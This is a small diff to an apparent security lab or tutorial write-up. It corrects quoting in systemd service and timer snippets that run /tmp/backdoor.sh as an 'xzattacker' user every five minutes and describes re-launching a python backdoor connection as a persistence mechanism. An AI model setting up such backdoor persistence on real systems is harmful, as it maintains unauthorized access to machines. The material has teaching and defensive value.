@@ -258,7 +258,7 @@ Description=xz service
 [Service]
 
 User=xzattacker
-ExecStart=/tmp/backdoor.sh"
+ExecStart=/tmp/backdoor.sh
 ```
 
 Now we create the timer for this service also in `/etc/systemd/system/xz.timer`. The timer will run every 5 minutes and trigger the backdoor.sh script. The script checks if the crontab entry is still there and if not runs a python backdoor connection.
@@ -275,7 +275,7 @@ OnUnitActiveSec=5m
 
 [Install]
 
-WantedBy=timers.target"
+WantedBy=timers.target
 ```
 
 Once finished we need to reload systemd, enable the timer and start it. Then we check if the timer is running correctly.
